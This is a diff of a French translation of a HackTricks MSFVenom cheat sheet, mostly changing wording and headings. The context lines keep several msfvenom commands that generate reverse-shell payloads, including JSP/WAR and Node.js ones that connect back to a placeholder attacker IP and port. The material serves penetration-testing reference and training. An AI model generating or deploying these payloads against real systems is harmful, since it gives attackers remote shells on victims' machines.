@@ -1,19 +1,21 @@
-# MSFVenom - CheatSheet
+# MSFVenom - Fiche mémo
+
+{{#include ../../banners/hacktricks-training.md}}
 
 ---
 
-## msfvenom basique
+## Bases de msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Utilisez `-a` pour sélectionner l'architecture du payload et `--platform` pour sélectionner sa plateforme cible.<sup>[[1]](#references)</sup>
+Utilisez `-a` pour sélectionner l’architecture du payload et `--platform` pour sélectionner sa plateforme cible.<sup>[[1]](#references)</sup>
 
-## Liste
+## Liste en cours de création
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-Ces commandes répertorient les modules de payload et d’encoder disponibles dans le framework installé.<sup>[[1]](#references)</sup>
+Ces commandes répertorient les modules payload et encoder disponibles dans le framework installé.<sup>[[1]](#references)</sup>
 
 ## Paramètres courants lors de la création d’un shellcode
 ```bash
@@ -113,7 +115,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Payloads en langage de script**
+## **Payloads en langages de script**
 
 ### **Perl**
 ```bash
